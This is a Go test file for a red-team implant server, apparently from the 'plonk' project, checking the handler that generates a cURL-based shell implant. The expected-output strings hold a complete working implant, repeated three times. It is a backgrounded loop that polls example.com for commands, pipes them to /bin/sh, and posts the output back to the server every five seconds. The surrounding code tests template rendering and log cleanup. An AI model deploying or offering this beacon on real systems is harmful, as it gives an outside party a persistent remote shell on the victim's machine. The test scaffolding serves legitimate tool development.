package implantsvr

/*
 * curlgen.go
 * Generate a cURL-based "implant"
 * By J. Stuart McMurray
 * Created 20231111
 * Last Modified 20231111
 */

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/magisterquis/plonk/internal/def"
	"github.com/magisterquis/plonk/lib/plog"
)

const dummyRandom = "RANDOMRANDOM"

func TestHandleCurlGen(t *testing.T) {
	s, lb := newTestServer(t)
	rr, rb := resrec()
	s.handleCurlGen(rr, httptest.NewRequest(
		http.MethodGet,
		def.CurlGenPath,
		nil,
	))
	if http.StatusOK != rr.Code {
		t.Errorf("Incorrect status %d", rr.Code)
	}

	want := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="RANDOMRANDOM-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
        (
                curl -s "example.com/t/$ID" |
                /bin/sh 2>&1 |
                curl --data-binary @- -s "example.com/o/$ID"
        ) </dev/null &
        sleep 5
done

_eof
`
	if got := removeTemplateRandomID(rb.String()); got != want {
		t.Errorf(
			"Implant from default template incorrect:\n"+
				" got:\n\n%s\n"+
				"want:\n\n%s",
			got,
			want,
		)
	}
	wantLog := `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`
	gotLog := plog.RemoveTimestamp(lb.String())
	gotLog = removeLogRandomID(gotLog)
	if gotLog != wantLog {
		t.Errorf(
			"Log from default template incorrect:\n"+
				" got: %s\n"+
				"want: %s",
			gotLog,
			wantLog,
		)
	}
	lb.Reset()

	have := `test {{ .URL }} test`
	want = `test example.com test`
	fn := filepath.Join(s.Dir, def.TemplateFile)
	if err := os.WriteFile(fn, []byte(have), 0640); nil != err {
		t.Fatalf("Error writing template to %s: %s", fn, err)
	}
	rr, rb = resrec()
	s.handleCurlGen(rr, httptest.NewRequest(
		http.MethodGet,
		def.CurlGenPath,
		nil,
	))
	if rc := rr.Result().StatusCode; http.StatusOK != rc {
		t.Errorf("Unexpected response code %d", rc)
	}
	if got := rb.String(); got != want {
		t.Errorf(
			"Custom implant generation incorrect\n"+
				"have: %s\n"+
				" got: %s\n"+
				"want: %s",
			have,
			got,
			want,
		)
	}

	wantLog = `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"filename":"implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`
	gotLog = plog.RemoveTimestamp(lb.String())
	gotLog = removeLogRandomID(gotLog)
	gotLog = regexp.MustCompile(
		`(.*"filename":").*/([^/"]+",".*)`,
	).ReplaceAllString(gotLog, "${1}${2}")
	if gotLog != wantLog {
		t.Errorf(
			"Log from default template incorrect:\n"+
				" got: %s\n"+
				"want: %s",
			gotLog,
			wantLog,
		)
	}
}

func TestRemoveTemplateRandomID(t *testing.T) {
	have := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="2t60x0nnmmd4h-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
	(
		curl -s "example.com/t/$ID" |
		/bin/sh 2>&1 |
		curl --data-binary @- -s "example.com/o/$ID"
	) </dev/null &
	sleep 5
done

_eof`
	want := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="` + dummyRandom + `-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
	(
		curl -s "example.com/t/$ID" |
		/bin/sh 2>&1 |
		curl --data-binary @- -s "example.com/o/$ID"
	) </dev/null &
	sleep 5
done

_eof`

	if got := removeTemplateRandomID(have); want != got {
		t.Fatalf(
			"removeIDRandom failed:\n"+
				"have:\n\n%s\n"+
				"\n got:\n\n%s\n"+
				"\nwant:\n\n%s\n",
			have,
			got,
			want,
		)
	}
}

func removeTemplateRandomID(s string) string {
	return regexp.MustCompile(
		`(ID=")[0-9a-z]+(-\$\(hostname)`,
	).ReplaceAllString(s, "${1}"+dummyRandom+"${2}")
}

func TestRemoveLogRandomID(t *testing.T) {
	for _, c := range []struct {
		have string
		want string
	}{{
		have: `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"2h6f496kna0k1","URL":"example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
		want: `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
	}, {
		have: `{"time":"2023-12-09T00:19:23.788320177+01:00","level":"INFO","msg":"Implant generation","parameters":{"RandN":"25b8oa5r9cuy3","URL":"example.com"},"filename":"/tmp/TestHandleCurlGen2103100159/001/implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
		want: `{"time":"2023-12-09T00:19:23.788320177+01:00","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"filename":"/tmp/TestHandleCurlGen2103100159/001/implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
	}} {
		c := c /* :( */
		t.Run("", func(t *testing.T) {
			if got := removeLogRandomID(c.have); got != c.want {
				t.Fatalf(
					"Incorrect removal:\n"+
						"have: %s\n"+
						" got: %s\n"+
						"want: %s",
					c.have,
					got,
					c.want,
				)
			}
		})
	}
}

func removeLogRandomID(s string) string {
	return regexp.MustCompile(
		`("RandN":")[^"]*(")`,
	).ReplaceAllString(s, "${1}${2}")
}
